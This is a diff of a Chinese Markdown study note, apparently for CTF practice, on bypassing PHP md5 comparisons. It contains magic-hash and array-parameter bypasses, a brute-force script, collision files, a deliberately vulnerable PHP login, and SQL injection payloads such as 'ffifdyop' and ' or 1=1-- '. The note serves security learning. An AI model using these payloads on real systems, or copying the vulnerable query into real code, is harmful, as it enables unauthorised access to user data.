@@ -1,83 +1,10 @@
-## MD5弱类型比较和强碰撞
+函数定义 `md5 ( string $string , bool $binary = false ) : string`
 
-`md5 ( string $string , bool $binary = false ) : string`
+- `string` 要计算的字符串
 
-- `string`
+- `binary` 如果可选的 `binary` 被设置为 **true**,那么 md5 摘要将以 16 字符长度的**原始二进制格式**返回
 
-	要计算的字符串
-
-- `binary`
-
-	如果可选的 `binary` 被设置为 **`true`**,那么 md5 摘要将以 16 字符长度的**原始二进制格式**返回
-
-### 基本知识
-
-php中有两种比较的符号`==`与`===`
-
-`==`在进行比较的时候,会把两端变量类型转换成相同的,再进行比较(一个字符串与一个数字相比较时,字符串会转换成数值)
-
-`===`在进行比较的时候,会先判断两种字符串的类型是否相等,再进行比较
-
-```php
-<?php
-$a=1;
-$b="a1";
-$c="1a";
-var_dump($a==$b);
-var_dump($a==$c);
-var_dump($a===$b);
-var_dump($a===$c);
-?>
-```
-
-```
-bool(false)
-bool(true)
-bool(false)
-bool(false)
-```
-
-`0e`开头且都是数字的字符串,**弱类型比较**都等于0
-
-```php
-<?php
-var_dump(0=='1a');
-var_dump(0=='a1');
-var_dump(0==0e1);
-var_dump(0=="0e1");
-var_dump(0===0e1);
-var_dump(0==="0e1");
-?>
-```
-
-```
-bool(false)
-bool(true)
-bool(true)
-bool(true)
-bool(false)
-bool(false)
-```
-
-字符串转数值时,调用了`intval()`取整函数,而这个函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错,而是返回0
-
-```php
-<?php
-var_dump(intval(4));
-var_dump(intval("10asd"));
-var_dump(intval("asd10"));
-var_dump(intval(1.23));
-?>
-```
-
-```
-int(4)
-int(10)
-int(0)
-int(1)
-```
-
-### 经典md5弱类型比较
+## md5弱类型比较
 
 ```php
 <?php
@@ -97,15 +24,14 @@ if(isset($_POST['a']) and isset($_POST['b'])){
 
 1. md5不能加密数组,在加密数组的时候会返回`NULL`,因此POST传参`a[]=1&b[]=2`
 
-```
-Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 4
-
-Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 4
-array(1) { [0]=> string(1) "1" } array(1) { [0]=> string(1) "2" }
-Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 7
-NULL
-Warning: md5() expects parameter 1 to be string, array given in /var/www/html/index.php on line 8
-NULL flag
+```php
+array (size=1)
+  0 => string '1' (length=1)
+array (size=1)
+  0 => string '2' (length=1)
+null
+null
+flag
 ```
 
 2. md5进行的是弱类型比较,如果两个md5之后的结果均为`0e`开头的字符串则会被判断为相等
@@ -118,7 +44,6 @@ for i in range(1000000000):
     a = hashlib.md5(str(i).encode("utf-8")).hexdigest()
     if re.match('^0e\d+$', a) is not None:
         print(i, a)
-
 ```
 
 ```
@@ -130,11 +55,15 @@ for i in range(1000000000):
 
 POST传参`a=240610708&b=314282422`
 
-```
-string(9) "240610708" string(9) "314282422" string(32) "0e462097431906509019562988736854" string(32) "0e990995504821699494520356953734" flag
+```php
+string '240610708' (length=9)
+string '314282422' (length=9)
+string '0e462097431906509019562988736854' (length=32)
+string '0e990995504821699494520356953734' (length=32)
+flag
 ```
 
-### md5强类型比较
+## md5强类型比较
 
 ```php
 <?php
@@ -183,9 +112,9 @@ c6b384c4968b28812b676b49d40c09f8af4ed4cc  md5a
 c728d8d93091e9c7b87b43d9e33829379231d7ca  md5b
 ```
 
-![image-20210409205849825](image-20210409205849825.png)
+![](./截屏2021-09-01%2018.08.29.png)
 
-### 例题
+## 例题
 
 ```php
 <?php 
@@ -214,7 +143,6 @@ if($_GET['param1']!==$_GET['param2']&&md5($_GET['param1'])===md5($_GET['param2']
             die('str1 not number'); 
         }
     }
-
 ?>
 ```
 
@@ -244,15 +172,14 @@ function random() {
     return $a+$b;
 }
 $r = random();
-    if((string)$_GET['a']==(string)md5($_GET['b'])){
-        if($_GET['a'].$r == md5($_GET['b'])) {
-            print "Yes,you are right";
-        }
-        else {
-            print "you are wrong";
-        }
+if((string)$_GET['a']==(string)md5($_GET['b'])){
+    if($_GET['a'].$r == md5($_GET['b'])) {
+        print "Yes,you are right";
     }
-
+else {
+        print "you are wrong";
+    }
+}
 ?>
 ```
 
@@ -275,3 +202,78 @@ md5`ffifdyop`得到`'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c`
 `($a != $b && md5($a) == md5($b))`,传两个数组,即可进入下一关
 
 `if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2']))`传两个md5相同的文件即可getflag
+
+## md5原始二进制格式造成sql注入
+
+>如果可选的 `binary` 被设置为 **true**,那么 md5 摘要将以 16 字符长度的**原始二进制格式**返回
+
+```php
+<?php
+var_dump(md5("123"));
+var_dump(md5("123",true));
+?>
+```
+
+```php
+string '202cb962ac59075b964b07152d234b70' (length=32)
+string ' ,�b�Y[�K-#Kp' (length=16)
+```
+
+![](./截屏2021-09-01%2019.10.19.png)
+
+```php
+<?php
+$db = new mysqli("172.16.172.202", "user", "password", "www");
+$username = $_POST["username"];
+$password = $_POST["password"];
+if (!isset($username) or !isset($password)) {
+    return false;
+}
+
+$username = addslashes($username);
+$password = addslashes($password);
+$query = 'SELECT id,username,password FROM test WHERE password="' . md5($password, true) . '" and username="' . $username . '"';
+
+var_dump($id);
+var_dump($username);
+var_dump($password);
+var_dump($query);
+
+$result = $db->query($query);
+
+if ($result->num_rows) {
+    while ($row = $result->fetch_assoc()) {
+        echo "id:" . $row["id"] . " username:" . $row["username"] . " password:" . $row["password"] . "<br>";
+    }
+}
+$db->close();
+?>
+```
+
+传入`username= or 1=1-- &password=128`
+
+```php
+string ' or 1=1-- ' (length=10)
+string '128' (length=3)
+string 'SELECT id,username,password FROM test WHERE password="v�an���l���q��\" and username=" or 1=1-- "' (length=97)
+id:1 username:a password:962012d09b8170d912f0669f6d7d9d07
+id:2 username:b password:912ec803b2ce49e4a541068d495ab570
+id:3 username:c password:fd2cc6c54239c40495a0d3a93b6380eb
+id:4 username:d password:81dc9bdb52d04dc20036dbd8313ed055
+```
+
+常用的绕过字符串
+
+```php
+<?php
+var_dump(md5("128",true));
+var_dump(md5("ffifdyop",true));
+var_dump(md5("129581926211651571912466741651878684928",true));
+?>
+```
+
+```
+string 'v�an���l���q��\' (length=16)
+string ''or'6�]��!r,��b' (length=16)
+string '�T0D��o#��'or'8' (length=16)
+```
